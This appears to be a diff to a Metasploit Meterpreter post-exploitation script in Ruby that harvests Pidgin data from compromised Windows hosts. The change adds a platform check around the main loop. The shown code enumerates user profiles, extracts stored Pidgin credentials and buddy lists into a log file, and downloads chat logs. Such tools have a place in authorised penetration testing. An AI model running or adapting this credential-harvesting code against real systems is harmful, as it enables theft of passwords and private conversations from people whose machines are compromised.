@@ -178,26 +178,31 @@ end
 #-------------------------------------------------------------------------------
 
 ################## MAIN ##################
-print_status("Running Meterpreter Pidgin Credential harvester script")
-print_status("All services are logged at #{dest}")
-enum_users(os).each do |u|
-	print_status("Checking if Pidgin profile is present for user :::#{u['username']}:::...")
-	### Find the path (if it exists) for this user,
-	pidgin_path = check_pidgin(u['userappdata'])
-	if pidgin_path
-		print_status("Pidgin profile found!")
-		### modified to use pidgin_path
-		if get_credentials
-			file_local_write(dest,extract_creds(pidgin_path))
+if client.platform =~ /win32|win64/
+	print_status("Running Meterpreter Pidgin Credential harvester script")
+	print_status("All services are logged at #{dest}")
+	enum_users(os).each do |u|
+		print_status("Checking if Pidgin profile is present for user :::#{u['username']}:::...")
+		### Find the path (if it exists) for this user,
+		pidgin_path = check_pidgin(u['userappdata'])
+		if pidgin_path
+			print_status("Pidgin profile found!")
+			### modified to use pidgin_path
+			if get_credentials
+				file_local_write(dest,extract_creds(pidgin_path))
+			end
+			if get_buddies
+				file_local_write(dest,extract_buddies(pidgin_path))
+				print_status("Buddie list has been saved to the log file.")
+			end
+			if get_logs
+				download_logs(logs,pidgin_path)
+			end
+		else
+			print_error("Pidgin profile not found!")
 		end
-		if get_buddies
-			file_local_write(dest,extract_buddies(pidgin_path))
-			print_status("Buddie list has been saved to the log file.")
-		end
-		if get_logs
-			download_logs(logs,pidgin_path)
-		end
-	else
-		print_error("Pidgin profile not found!")
 	end
+else
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
